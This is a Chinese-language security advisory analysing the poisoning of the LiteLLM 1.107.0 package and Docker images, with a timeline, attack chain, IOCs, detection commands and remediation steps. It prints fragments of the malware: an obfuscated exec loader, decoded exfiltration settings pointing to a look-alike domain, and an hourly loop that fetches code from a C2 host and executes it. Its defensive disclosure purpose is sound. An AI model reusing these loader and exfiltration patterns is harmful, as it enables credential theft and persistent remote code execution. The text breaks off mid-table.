---
title: LiteLLM 1.107.0 供应链投毒安全事件分析预警
url: https://mp.weixin.qq.com/s/FPByUPqe0eibFWq2fT1SJw
source: Doonsec's feed
date: 2026-11-02
fetch_date: 2026-11-03T08:47:33.368992
---

# LiteLLM 1.107.0 供应链投毒安全事件分析预警

# LiteLLM 1.107.0 供应链投毒安全事件分析预警

原创

天元实验室
天元实验室

M01N Team

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/uZT6kWW1jCmSAA5ZBvLJUJDwzc4OMJMsic4tXLyOMPAVNAcXktjZBgFAcqg9noLTsQ7c5bo9aCvLZklPZRECb7QfFGMUySK6lNviabjTpXnt0/640?wx_fmt=gif&from=appmsg)

**概述**

LiteLLM 是 BerriAI 维护的开源 AI 网关，GitHub 约 6.2 万 star（61,760）、12,559 fork，月下载量约 9200 万（近 30 天 92,239,101），fofa搜索存在资产183,523条。它把各主流 LLM 供应商（OpenAI、Anthropic Claude、AWS Bedrock、Google Gemini、Azure AI 等）的 API 统一为 OpenAI 兼容格式，应用一次接入即可调用 100+ 模型。在企业架构中，LiteLLM 通常位于应用层与 LLM供应商之间，承担负载均衡、速率限制、成本追踪与 API 密钥管理等职责。由于集中托管了所有上游 LLM 供应商的 API 密钥与凭证，LiteLLM 属于高价值攻击目标。

**LiteLLM 官方 PyPI 包 v1.107.0 于 2026 年 10 月 21 日遭供应链投毒**（记录编号 MAL-2026-2144），**所有 7 个 wheel 均携带凭据窃取器与远程代码执行后门**；官方 Docker 镜像的多个标签同样受影响。 已安装并在投毒窗口内运行过 Python 的主机、容器或 CI Runner，应按“已失陷”处置并立即轮换凭据。

**01 事件概览**

|  |  |
| --- | --- |
| **项目** | **内容** |
| 受影响包 | litellm==1.107.0，PyPI 全部 7 个平台 wheel 均含恶意载荷 |
| 受影响镜像 | litellm/litellm:v1.107.0；GHCR 的 v1.107.0、latest、main-latest、main-stable 在观测时指向同一受影响镜像 |
| PyPI 暴露窗口 | 2026-10-21 11:39–13:23 UTC |
| Docker/GHCR 暴露窗口 | 2026-10-21 约 11:46–14:20/14:32 UTC，恶意镜像随后被移除 |
| 官方结论 | LiteLLM 确认发布流水线被入侵，受影响版本已下架；企业私有发布版未受影响 |
| 历史关联 | 这是 2026 年 LiteLLM 第二次供应链事件；3 月的 1.82.7、1.82.8 也曾被投毒 |

LiteLLM 官方表示，攻击者疑似通过三名工程师的 GitHub CLI OAuth Token 触发并批准了发布流水线；相关 Token 已被吊销，但攻击入口仍在调查中。

**02 风险概述**

恶意代码并不等待用户 import litellm。攻击者通过 wheel 的 purelib 数据目录，把三个文件直接释放到 site-packages 根目录：

* cook.pth：内容为 import cook，Python 每次启动都会处理 .pth 文件并执行该导入；
* cook.py：凭据窃取器，启动后即收集并外传敏感信息；
* sitecustomize.py：Python 启动时自动导入，负责启动后台远程代码加载器。

因此，只要在该环境中启动过 python 或 pip，即使业务代码从未调用 LiteLLM，恶意逻辑也可能已经执行。 更严重的是，在受感染环境中运行 pip uninstall 或 pip install 修复版本，本身也会再次触发这些启动钩子。

**03 窃取与后门能力**

cook.py 内嵌 Base64+zlib 压缩的约 61 KB 载荷，包含 16 个收集模块，目标包括：

* 云与基础设施凭据：AWS、Azure、GCP、Kubernetes、Docker、GitHub CLI、Vault、Terraform、CI/CD 配置及容器挂载 Secret；
* 开发者资产：SSH 私钥、GPG/TLS 私钥、Git 凭据、.env、.netrc、npm/PyPI 配置；
* AI 工具凭据：Claude、Codex、Gemini、Cursor、Copilot、Windsurf、Hugging Face 等工具的配置与 Token；
* 浏览器与主机信息：Chromium 系浏览器及 Firefox 的登录数据、Cookie、历史记录，Shell 历史；
* 运行时信息：环境变量，Linux 上还可读取其他进程的 /proc/<pid>/environ；
* LiteLLM 专属目标：当配置了 DATABASE\_URL 时，尝试读取 Proxy 数据库中的 LiteLLM\_CredentialsTable 与 LiteLLM\_ProxyModelTable，即上游 Provider API Key 和模型配置。

收集结果经 AES-256-CBC 加密、RSA-4096 公钥封装后，POST 至仿冒域名：

```
hxxp://www[.]litellm[.]dev/healthcheck
```

该域名并非 LiteLLM 官方域名；官方项目域名为 litellm.ai。

sitecustomize.py 则会 fork 一个脱离终端的后台进程，创建 /tmp/remote\_code\_loader.lock，每小时从 GitHub 仓库 letters9813/pythonclient-test 的 domain.txt 获取 C2 域名，再从 http://<domain>/codepy 下载 Python 代码并直接 exec 执行。这构成可持续的远程代码执行通道，而非一次性信息窃取。

**04 攻击链完整还原**

**4.1 入侵发布流水线**

攻击者获得或滥用 LiteLLM 工程师的 GitHub CLI OAuth Token，触发并批准了发布 Workflow。

官方 Git Tag 本身可能是干净的，但实际发布到 PyPI 的 wheel 来自被篡改的构建源。SafeDep 的取证分析指出，恶意发布制品与公开 Git tag 不一致，说明攻击发生在构建或发布环节，而非单纯修改源码仓库。

**4.2 构建恶意 wheel**

攻击者通过 pyproject.toml 中加入 data = "cook" 配置。

```
data = "cook"
```

随后，攻击者将恶意文件放入 cook/ 目录。

构建 wheel 时，data = "cook" 会使构建系统把 cook/ 目录内容写入 wheel 内部的：

```
<package>.data/purelib/
```

**4.3 发布至 PyPI 与镜像仓库**

恶意 litellm==1.107.0 被发布到 PyPI，并被构建为 Docker 镜像推送至 Docker Hub 和 GHCR。

**4.4 用户安装或拉取镜像**

用户执行：

```
pip install litellm==1.107.0
```

或拉取

```
docker pull litellm/litellm:v1.107.0
```

会解包 wheel，并将 .data/purelib 中的内容释放到目标 Python 环境的 site-packages 根目录。

于是，三个恶意文件被放置到，恶意文件进入 Python 环境或容器文件系统。

```
site-packages/cook.pthsite-packages/cook.pysite-packages/sitecustomize.py
```

这就是整个攻击的“落地点”。

**4.5 Python 启动即执行**

一旦运行：

```
pythonpippytestuvpython -m xxx
```

Python 会依次处理：

* cook.pth：执行 import cook；
* cook.py：启动凭据收集；
* sitecustomize.py：启动远程代码加载器。

**4.6 收集凭据并外传**

cook.py 内嵌 Base64+zlib 压缩的约 61 KB 载荷，包含 16 个收集模块。

```
import zlib as _3659944d,base64 as _35100b45;exec(_3659944d.decompress(_35100b45.b64decode('eNrdfWt327qu4Pf+Ck/XdCTvxu9HnJydcydN0zZtHt1J+nRytGSJtlXLkirJdpKuzm8fAKQk6mU77b53zp2uvWNbAkGQAEEAJEFr7rl+WHGDnUpwD39Ca852Kt8C19mpWO5OxYdfvu6Y7hwApovQsncqIz1g/S78do0ZC3cq...')), {'__name__': 'p14c7d1bb'})
```

对其解码后：

```
PC_URL = 'http://www.litellm.dev/healthcheck'PC_TOKEN = 'XWiA8gZNa7NcX2XRoAEb'PC_PUBKEY = '-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvxRBQMVXDXVskKS47haU...'PC_MODULES = ['sysinfo', 'netinfo', 'browser_pw', 'browser_hist', 'ssh_keys', 'shell_hist',              'cloud_creds', 'dev_secrets', 'container_creds', 'cicd_secrets', 'ai_devtools',              'env_vars', 'db_litellm', 'cloud_metadata', 'gpg_keys', 'tls_privkey']PC_ONCE_PATH = '/tmp/.pc_once_72129118c59f5636c0bb'PC_ASYNC = True
```

收集结果经 AES-256-CBC 加密，并使用内嵌 RSA-4096 公钥封装，随后 POST 至仿冒域名：

```
hxxp://www[.]litellm[.]dev/healthcheck
```

公开报告披露的请求头包括：

```
X-Token: XWiA8gZNa7NcX2XRoAEb
```

注意：litellm.dev 并非 LiteLLM 官方域名；官方项目域名为 litellm.ai。

**4.7 建立每小时远程执行通道**

sitecustomize.py 会 fork 一个脱离终端的后台进程，并创建：

```
/tmp/remote_code_loader.lock
```

该进程每小时执行以下操作：

```
GITHUB_RAW_URL = "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"CODE_PATH = "/codepy"LOOP_INTERVAL = 3600...    text = await fetch_text(GITHUB_RAW_URL)    domain = next((line.strip() for line in text.splitlines() if DOMAIN_RE.match(line.strip())), None)    ifnot domain:        return    await resolve_domain(domain)    ...    code = await fetch_text("http://{}{}".format(domain, CODE_PATH))    await exec_code(code)
```

访问 GitHub dead drop：

```
https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt
```

获取 C2 域名后，从：

```
http://<C2>/codepy
```

下载 Python 代码，并直接通过 exec() 执行。

这已经不是一次性的信息窃取，而是可持续更新的远程代码执行通道。

**05 影响判定**

**高风险（按已失陷处理）：**

* 在 2026-10-21 11:39–13:23 UTC 期间，从 PyPI 安装、升级或解析到 litellm==1.107.0，且随后运行过 Python；
* 在 2026-10-21 约 11:46–14:20 UTC 期间，拉取或启动过受影响 Docker/GHCR 镜像；
* 使用 latest、main-latest、main-stable 等浮动标签，且在该窗口内发生镜像拉取、Pod 重启、自动扩缩容或 CI 构建；
* LiteLLM 作为 DSPy、CrewAI、MCP Server、Agent 框架等的传递依赖被自动安装。

**相对低风险：**

* 未安装 1.107.0，或仅下载/静态检查 wheel 而未在受影响环境中启动 Python；
* 使用企业私有发布版 LiteLLM；官方称该发布渠道未受影响。

注意：/tmp/.pc\_once\_72129118c59f5636c0bb 标记文件不存在，不能证明主机未被感染；上传失败、/tmp 清理或容器重建都可能导致标记缺失。

**06 紧急处置步骤**

首要原则：不要先在疑似受感染环境中运行 python、pip 或任何 Python 工具；先用可信介质、宿主机 Shell 或独立取证环境检查。

**6.1 立即隔离与止损**

* 停止部署、调度和自动拉取 litellm==1.107.0；
* 停用并隔离安装过该版本的开发机、CI Runner、构建容器、Proxy 容器；
* 在包代理、制品库、防火墙和 DNS 层封禁 litellm==1.107.0、相关恶意 wheel 哈希及 litellm.dev；
* 保留进程列表、网络日志、容器层、构建日志和文件系统证据，再执行清理或重建。

**6.2 排查恶意文件与进程**

在**不启动 Python**的前提下，检查每个虚拟环境、容器层和镜像中的 site-packages 根目录：

```
find / -path '*/site-packages/cook.pth' -o \       -path '*/site-packages/cook.py' -o \       -path '*/site-packages/sitecustomize.py'2>/dev/null
```

同时检查：

```
/tmp/.pc_once_72129118c59f5636c0bb/tmp/remote_code_loader.lock
```

排查持有 /tmp/remote\_code\_loader.lock 的脱离终端 Python 进程；sitecustomize.py 文件名本身不构成确凿 IOC，应结合文件位置、大小、哈希和出网行为判断。

**6.3清理与重建**

* 删除 cook.pth、cook.py、sitecustomize.py 及对应 \_\_pycache\_\_ 编译产物；
* 终止后台 Loader 进程；
* **优先重建虚拟环境、容器镜像和 CI Runner，**而不是仅卸载 LiteLLM；
* 回退至官方确认的干净版本 litellm==1.106.2，并使用哈希或镜像 digest 固定，而非仅固定版本号。

**6.4 全面轮换凭据**

只要受影响主机具备出网能力，应默认认为凭据外传可能已成功。需从干净环境轮换：

* LiteLLM Proxy 数据库中的 Provider API Key、Master Key、Virtual Key 及数据库口令；
* AWS、Azure、GCP 的访问凭据、实例角色、Workload Identity；
* Kubernetes ServiceAccount Token、kubeconfig、镜像拉取 Secret；
* GitHub/GitLab PAT、SSH Key、GPG Key、CI/CD 与制品库 Token；
* OpenAI、Anthropic、Gemini、Cohere 等 LLM Provider Key；
* 浏览器保存密码、Cookie、AI 编程工具登录态；
* 所有曾存在于受影响进程环境变量中的敏感值。

轮换后，应回溯云厂商、身份提供商、代码托管平台和容器仓库的审计日志，检查安装时间之后是否存在异常登录、Token 使用、镜像推送或资源创建。

**07 公开IOC**

**文件IOC**

```
site-packages/cook.pthsite-packages/cook.pysite-packages/sitecustomize.py/tmp/.pc_once_72129118c59f5636c0bb/tmp/remote_code_loader.lock
```

**网络IOC**

```
hxxp://www[.]litellm[.]dev/healthcheckX-Token: XWiA8gZNa7NcX2XRoAEbhttps://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt http://<C2>/codepy
```

**供应链IOC**

```
litellm==1.107.0litellm/litellm:v1.107.0GHCR tags: v1.107.0, latest, main-latest, main-stable
```

**08 检测规则建议**

|  |  |
| --- | --- |
| **类型** | **规则** |
| 文件 | site-packages/cook.pth、site-packages/cook.py、根级异常 sitecustomi...